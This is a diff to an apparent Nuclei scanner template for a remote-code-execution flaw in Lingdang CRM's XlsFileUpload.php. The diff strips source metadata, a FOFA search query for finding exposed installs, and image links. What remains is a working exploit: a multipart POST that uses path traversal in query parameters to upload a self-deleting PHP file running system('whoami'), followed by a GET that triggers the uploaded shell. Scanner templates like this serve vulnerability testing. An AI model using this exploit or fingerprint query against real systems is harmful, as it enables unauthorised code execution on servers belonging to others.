@@ -3,12 +3,8 @@ info:
   name: 灵当CRM XlsFileUpload.php 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gpvic2a2e38wvynt'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gpvic2a2e38wvynt
-    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM"
 http:
 - raw:
   - 'POST /crm/modules/Products/haige/XlsFileUpload.php?frommodule=1/../../../../../&cur_module=1/../storage/rce HTTP/1.1
@@ -29,18 +25,14 @@ http:
 
     <?php system("whoami");unlink(__FILE__);?>
 
-    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856577886-83536d48-1089-4642-9d33-f4a64afcfe94.png)'
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--'
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - 'GET /crm/storage/rce_haige.php HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856578073-02d9b625-7b25-4abd-8681-e29e0953332e.png)'
+  - GET /crm/storage/rce_haige.php HTTP/1.1
   redirects: false
   matchers:
   - status:
